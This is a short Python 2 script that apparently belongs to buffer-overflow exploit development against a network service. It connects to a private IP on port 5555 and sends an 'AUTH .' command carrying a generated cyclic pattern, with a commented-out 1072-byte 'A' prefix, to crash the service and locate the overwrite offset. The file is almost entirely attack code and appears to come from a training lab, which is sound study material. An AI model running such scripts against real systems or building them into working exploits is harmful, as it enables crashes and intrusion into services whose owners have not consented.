#!/usr/bin/python
import socket
server = '192.168.43.34'
sport = 5555

#prefix = 'A' * 1072
chars = ''
for i in range(0x30, 0x35):
	for j in range(0x30, 0x3A):
		for k in range(0x30, 0x3A):
			chars += chr(i) + chr(j) + chr(k) + 'A'
attack = chars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to AUTH . with length ", len(attack)
s.send(('AUTH .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()

